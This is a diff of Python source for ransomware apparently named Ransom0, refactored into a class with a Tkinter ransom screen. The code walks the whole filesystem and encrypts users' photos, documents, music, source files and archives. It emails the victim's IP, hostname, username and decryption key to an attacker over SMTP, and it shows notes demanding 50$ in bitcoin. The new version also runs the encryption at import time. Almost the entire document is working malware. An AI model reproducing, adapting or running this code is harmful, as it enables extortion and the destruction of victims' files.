@@ -1,42 +1,52 @@
-import os, platform, random, smtplib, ssl, socket, shutil, subprocess
-from os import system, name
-from requests import get
-from datetime import datetime
-from progress.bar import Bar
-from progress.spinner import Spinner
+
+import os, platform, smtplib, ssl, socket, shutil, time
+from os import system, name, path
 from cryptography.fernet import Fernet
-
-key = Fernet.generate_key()
-username = os.getlogin()
-digits = random.randint(1111,9999) 
-time_now = datetime.now().time()
-hostname = socket.gethostname()
-IP = get('https://api.ipify.org').text
-PATH = os.getcwd()
-
-# Email Settings
-port = 587  
-smtp_server = "" # Enter the smtp server of your email provider
-sender_email = ""  # Enter your address
-receiver_email = ""  # Enter receiver address
-password = "" # your email password
-
-EXCLUDE_DIRECTORY = ('/usr', #Mac/Linux system directory
-                    '/Library/',
-                    '/System',
-                    '/Applications',
-                    '.Trash',
-                    #Windows system directory
-                    'Program Files',
-                    'Program Files (x86)',
-                    'Windows',
-                    '$Recycle.Bin',
-                    'AppData',
-
-)
+from datetime import datetime
+from requests import get
+from cryptography.fernet import Fernet
+import tkinter as tk
+import shutil, os
+from tkinter import *
+from random import randint
 
 
-EXTENSIONS = (
+digits = randint(1111,9999) 
+
+
+class ransom0:
+    key = Fernet.generate_key()
+    username = os.getlogin()
+    time_now = datetime.now().time()
+    hostname = socket.gethostname()
+    IP = get('https://api.ipify.org').text
+    PATH = os.getcwd()
+
+
+    # Email Settings
+    port = 587  
+    smtp_server = "" # Enter the smtp server of your email provider
+    sender_email = ""  # Enter your address
+    receiver_email = ""  # Enter receiver address
+    password = "" # your email password
+
+    EXCLUDE_DIRECTORY = ('/usr', #Mac/Linux system directory
+                            '/Library/',
+                            '/System',
+                            '/Applications',
+                            '.Trash',
+                            #Windows system directory
+                            'Program Files',
+                            'Program Files (x86)',
+                            'Windows',
+                            '$Recycle.Bin',
+                            'AppData',
+                            
+                            'logs',
+
+        )
+
+    EXTENSIONS = (
         # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
         '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
         '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
@@ -55,176 +65,200 @@ EXTENSIONS = (
         '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files
 
         '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
-    )
+            )
 
+    def clear(self): 
+        if name == 'nt': 
+            _ = system('cls') 
 
-#Clear Screen Function
-def clear(): 
-    if name == 'nt': 
-        _ = system('cls') 
+        else: 
+            _ = system('clear') 
 
-    else: 
-        _ = system('clear') 
-
-def FindFiles():
-    load_state = 0
-    spinner = Spinner('Finding Files ')
-    while load_state != 'FINISHED':
-        f = open("logs/path.txt", "a")
+    def FindFiles(self):
+        f = open("logs/path.txt", "w")
         cnt = 0
         for root, dirs, files in os.walk("/"):
-        # for root, files in os.walk("/YOUR/TESTING/DIRECTORY"):   
-                for dir in dirs:
-                    if any(s in root for s in EXCLUDE_DIRECTORY):
-                        spinner.next()
-                        pass
-                    else:
-                        for file in files:
-                            if file.endswith(EXTENSIONS):
-                                cnt += 1
-                                TARGET = os.path.join(root, file)
-                                f.write(TARGET+'\n')
-                                spinner.next()
-                                print(root)
-
+            if any(s in root for s in self.EXCLUDE_DIRECTORY):
+                pass
+            else:
+                for file in files:
+                     if file.endswith(self.EXTENSIONS):
+                        TARGET = os.path.join(root, file)
+                        f.write(TARGET+'\n')
+                        print(root)
 
         f.close()
         f = open("logs/cnt.txt", "w")
         f.write(str(cnt))
         f.close()
-        load_state = 'FINISHED'
 
-    print()
-    print("Found {} target files".format(cnt))
-    print()
+    def Encrypt(self, filename):
+        f = Fernet(self.key)
+        with open(filename, "rb") as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open(filename, "wb") as file:
+            file.write(encrypted_data)
+        print(filename)
+
+    def SendData(self):
+        DataSend = ("""
+        time: {}
+        IP: {}
+        Hostname: {}
+        username: {}
+        id: {}
+        key: {}
+        """).format(self.time_now, self.IP, self.hostname, self.username, str(digits), str(self.key))
+        print("Sending Data")
+        context = ssl.create_default_context()
+        with smtplib.SMTP(self.smtp_server, self.port) as server:
+            server.ehlo()  # Can be omitted
+            server.starttls(context=context)
+            server.ehlo()  # Can be omitted
+            server.login(self.sender_email, self.password)
+            server.sendmail(self.sender_email, self.receiver_email, DataSend)
 
 
 
-def encrypt(filename):
-    f = Fernet(key)
-    with open(filename, "rb") as file:
-        file_data = file.read()
-    encrypted_data = f.encrypt(file_data)
-    with open(filename, "wb") as file:
-        file.write(encrypted_data)
-
-
-def DISPLAY():
-    print("""
-    ____                                  ___  
-    |  _ \ __ _ _ __  ___  ___  _ __ ___  / _ \ 
-    | |_) / _` | '_ \/ __|/ _ \| '_ ` _ \| | | |
-    |  _ < (_| | | | \__ \ (_) | | | | | | |_| |
-    |_| \_\__,_|_| |_|___/\___/|_| |_| |_|\___/ 
-                                                
-    """)
-    print("Time: {}".format(time_now))
-    print("IP Adress: {}".format(IP))
-    print("Platform: {}".format(platform.system()))
-    print("Hostname: {}".format(hostname))
-    print("User: {}".format(username))
-    print("ID: {}".format(str(digits)))
-    print()
-
+ransom0 = ransom0()
 
 def StartRansom():
-    FindFiles()
-    f = open("logs/cnt.txt", "r")
-    cnt = f.read()
-    f.close()
-    with Bar('Encrypting', max=int(cnt)) as bar:
+    try:
+        ransom0.FindFiles()
+        f = open("logs/cnt.txt", "r")
+        cnt = f.read()
+        f.close()
         filepath = 'logs/path.txt'
         with open(filepath) as fp:
             line = fp.readline()
             while line:
                 filename = line.strip()
                 try:
-                    encrypt(filename)
+                    ransom0.Encrypt(filename)
                 except Exception:
                     print("!Permission denied")
                     pass
                 line = fp.readline()
-                bar.next()
-    fp.close()
-    print()
-    SendData()
-    clear()
-    DecyptMessage(False)
+        fp.close()
+    except FileNotFoundError:
+        os.mkdir("logs")
+        f = open("logs/digits.txt", "w")
+        f.write(str(digits))
+        f.close()
+        StartRansom()
 
-def decrypt(filename):
-    f = open("logs/key_data.txt", "r")
-    key = f.read()
-    f.close()
-    f = Fernet(key)
-    with open(filename, "rb") as file:
-        encrypted_data = file.read()
-    decrypted_data = f.decrypt(encrypted_data)
-    with open(filename, "wb") as file:
-        file.write(decrypted_data)
+StartRansom()
+ransom0.SendData()
+
+PATH = os.getcwd()
 
 
-def DecyptMessage(INVALID_KEY):
-    clear()
-    DISPLAY()
-    if INVALID_KEY == True:
-        print("Invalid Key !")
-    else: 
-        pass
-    print("""
-    To get the decryption key, please send 50$ in bitcoin to BITCOIN ADRESS 
-    And send proof of transfer, your id and your name to  EMAIL ADRESS
-    """)
-    key_data = input('key: ')
-    f = open("logs/key_data.txt", "w")
-    f.write(key_data)
-    f.close()
-    with open('logs/path.txt') as fp:
-        line = fp.readline()
-        while line:
-            filename = line.strip()
-            try:
-                decrypt(filename)
-            except PermissionError:
-                print("!Permission Denied")
-                pass
-            except Exception:
-                DecyptMessage(True)
+
+
+def DECRYPT_FILE():
+    root= tk.Tk()
+    width = root.winfo_screenwidth() # Get screen width
+    height = root.winfo_screenheight() # Get screen height
+
+
+    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
+    canvas1.pack()
+
+    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
+    label1.config(font=('helvetica', int(height/20)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/15), window=label1)
+
+
+    img = tk.PhotoImage(file="lock.ppm")
+    img = img.subsample(2) 
+    img = img.zoom(1)
+    label = tk.Label(root, image=img)
+    label.config(background='black', foreground='red')
+    canvas1.create_window(width/2, height/4, window=label)
+
+
+    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.') # Title
+    label1.config(font=('helvetica', int(height/50)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)
+
+
+    label1 = tk.Label(root, text='to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com') # Title
+    label1.config(font=('helvetica', int(height/50)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)
+
+    label1 = tk.Label(root, text='YOUR DIGITS IS {}'.format(digits))# Display digits
+    label1.config(font=('helvetica', int(height/50)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/20)*10, window=label1)
+
+
+
+    label1 = tk.Label(root, text='KEY:') # Title
+    label1.config(font=('helvetica', int(height/50)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
+    entry1 = tk.Entry (root) 
+    canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)
+
+
+
+
+    def decrypt(filename):
+        key = entry1.get()
+        f = Fernet(key)
+        with open(filename, "rb") as file:
+            encrypted_data = file.read()
+        decrypted_data = f.decrypt(encrypted_data)
+        with open(filename, "wb") as file:
+            file.write(decrypted_data)
+
+    def DECRYPT_FILE():
+        with open('logs/path.txt') as fp:
             line = fp.readline()
-    print("Your file have been decrypted")
-    fp.close()
-    shutil.rmtree(PATH+'/logs', ignore_errors=True)
-    exit()
+            while line:
+                filename = line.strip()
+                try:
+                    decrypt(filename)
+                except PermissionError:
+                    print("!Permission Denied")
+                    pass
+                line = fp.readline()
+        fp.close()
+
+        label1 = tk.Label(root, text='YOUR FILES HAVE BEEN DECRYPTED') # Title
+        label1.config(font=('helvetica', int(height/50)))
+        label1.config(background='black', foreground='red')
+        canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
+        shutil.rmtree(PATH+'/logs', ignore_errors=True)
+        exit()
 
 
+        canvas1.create_window(int(width/2), 340, window=label1)  
 
-def SendData():
-    DataSend = ("""
-    time: {}
-    IP: {}
-    Hostname: {}
-    username: {}
-    id: {}
-    key: {}
-    """).format(time_now, IP, hostname, username, str(digits), str(key))
-    print("Sending Data")
-    context = ssl.create_default_context()
-    with smtplib.SMTP(smtp_server, port) as server:
-        server.ehlo()  # Can be omitted
-        server.starttls(context=context)
-        server.ehlo()  # Can be omitted
-        server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, DataSend)
+
+    button1 = tk.Button(text='Decrypt', command=DECRYPT_FILE)
+    button1.config(background='red')
+    canvas1.create_window(int(width/2), int(height/20)*13, window=button1)
+
+    root.mainloop()
+
+
 
 if __name__ == '__main__':
     # Generate digits ID or read generated value from digits.txt
-    if os.path.isfile("logs/digits.txt") == True:
+    if path.exists("logs") == True:
         f = open("logs/digits.txt", "r")
         digits = f.read()
         f.close()
-        DecyptMessage(False)
+        DECRYPT_FILE()
     else:
         os.mkdir("logs")
         f = open("logs/digits.txt", "w")
         f.write(str(digits))
         f.close()
         StartRansom()
+
